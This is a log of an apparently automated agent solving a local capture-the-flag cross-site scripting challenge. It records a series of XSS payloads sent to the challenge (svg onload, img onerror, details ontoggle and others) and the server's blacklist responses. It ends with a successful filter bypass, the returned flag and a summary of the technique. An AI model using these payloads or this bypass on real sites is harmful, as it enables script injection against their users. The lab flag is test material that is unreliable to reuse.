+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: 'onerror'</div>\n                       
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:19] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             svg+onload%3Dalert%28%27XSS%27%29%3E",             
+                              "method": "GET", "poc": false}                    
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:19             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "811",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: 'onload'</div>\n                        
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:20] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             body+onload%3Dalert%28%27XSS%27%29%3E"             
+                             , "method": "GET", "poc": false}                   
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:20             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "811",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: 'onload'</div>\n                        
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:21] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             img+src%3Dx+OnError%3Dalert%28%27XSS%2             
+                             7%29%3E", "method": "GET", "poc":                  
+                             false}                                             
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:21             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "812",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: 'onerror'</div>\n                       
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:28] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             details+open+ontoggle%3Dalert%28%27XSS             
+                             %27%29%3E", "method": "GET", "poc":                
+                             false}                                             
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:28             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "806",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: '''</div>\n                             
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:29] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             input+onfocus%3Dalert%28%27XSS%27%29+a             
+                             utofocus%3E", "method": "GET", "poc":              
+                             false}                                             
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:29             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "806",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: '''</div>\n                             
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:31] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             marquee+onstart%3Dalert%28%27XSS%27%29             
+                             %3E", "method": "GET", "poc": false}               
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:31             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "806",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: '''</div>\n                             
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             a+href%3Djavascript%3Aalert%28%27XSS%2             
+                             7%29%3EClick%3C%2Fa%3E", "method":                 
+                             "GET", "poc": false}                               
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:31             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "811",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: 'script'</div>\n                        
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:42] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             details+open+ontoggle%3Dalert(%22XSS%2             
+                             2)%3E", "method": "GET", "poc": false}             
+[04/12/26 21:21:44] INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:44             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "989",                       
+                                 "X-XSS-Protection": "0",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             \n                    <div                         
+                             class=\"solution-text\"><img                       
+                             src=\"static/img/cookies/success_star.             
+                             png\" alt=\"Correct\" width=\"150\"                
+                             height=\"150\"><br>Congratulations!<p>             
+                             Here is the flag:                                  
+                             flag{1ed5a2a2-4910-4843-bfcf-61d3d8831             
+                             730}</div>\n                    <input             
+                             type=text name=name                                
+                             placeholder=\"Enter your name...\" >               
+                             <details open                                      
+                             ontoggle=alert(\"XSS\")>>\n                        
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             details+open+ontoggle%3Dalert%60XSS%60             
+                             %3E", "method": "GET", "poc": false}               
+[04/12/26 21:21:47] INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:47             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "987",                       
+                                 "X-XSS-Protection": "0",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             \n                    <div                         
+                             class=\"solution-text\"><img                       
+                             src=\"static/img/cookies/success_star.             
+                             png\" alt=\"Correct\" width=\"150\"                
+                             height=\"150\"><br>Congratulations!<p>             
+                             Here is the flag:                                  
+                             flag{1ed5a2a2-4910-4843-bfcf-61d3d8831             
+                             730}</div>\n                    <input             
+                             type=text name=name                                
+                             placeholder=\"Enter your name...\" >               
+                             <details open ontoggle=alert`XSS`>>\n              
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             details+open+ontoggle%3Dalert(1)%3E",              
+                             "method": "GET", "poc": false}                     
+[04/12/26 21:21:49] INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:49             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "946",                       
+                                 "X-XSS-Protection": "0",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             \n                    <div                         
+                             class=\"solution-text\"><img                       
+                             src=\"static/img/cookies/error_star.pn             
+                             g\" alt=\"Fail\" width=\"150\"                     
+                             height=\"150\"><br>Oops! You did an                
+                             alert with 1 instead of                            
+                             \"XSS\"</div>\n                                    
+                             <input type=text name=name                         
+                             placeholder=\"Enter your name...\" >               
+                             <details open ontoggle=alert(1)>>\n                
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:22:01] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    WARNING  FINDING      [CRITICAL]  Reflected XSS logger.py:74
+                             via `name` parameter — filter bypass               
+                             with double quotes  @                              
+                             http://172.17.0.1:49471/page?name=...              
+[04/12/26 21:22:03] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             details+open+ontoggle%3Dalert(%22XSS%2             
+                             2)%3E", "method": "GET", "poc": true}              
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {"error": "Cannot connect to host                  
+                             127.0.0.1:8080 ssl:False [Connect call             
+                             failed ('127.0.0.1', 8080)]", "hint":              
+                             "If poc=true, make sure Burp Suite is              
+                             open with proxy on                                 
+                             http://127.0.0.1:8080"}                            
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:22:07] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_RESULT  save_poc                  logger.py:61
+                             {"saved":                                          
+                             "/root/agent-smith/pocs/20260412_21220             
+                             7_xss-details-ontoggle-filter-bypass.h             
+                             ttp", "hint": "Open Burp Repeater and              
+                             paste this file to load the request"}              
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:22:10] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         complete blocked: NO      logger.py:84
+                             DIAGRAM: call report(action='diagram')             
+                             with a Mermaid diagram of the                      
+                             application architecture before                    
+                             completing.                                        
+[04/12/26 21:22:16] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     DIAGRAM      Dalgona Challenges -      logger.py:79
+                             Application Architecture                           
+[04/12/26 21:22:18] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Scan complete — CTF flag  logger.py:84
+                             extracted:                                         
+                             flag{1ed5a2a2-4910-4843-bfcf-61d3d8831             
+                             730}. Target: Dalgona Challenges                   
+                             (Flask 3.1.8). Vulnerability:                      
+                             Reflected XSS on /page?name=                       
+                             parameter. WAF blacklist blocks:                   
+                             script, onerror, onload, single-quote              
+                             ('). Bypass: <details open                         
+                             ontoggle=alert("XSS")> using the                   
+                             ontoggle event handler with                        
+                             double-quoted string argument.                     
+                             Server-side validated the alert('XSS')             
+                             execution and returned the flag.                   
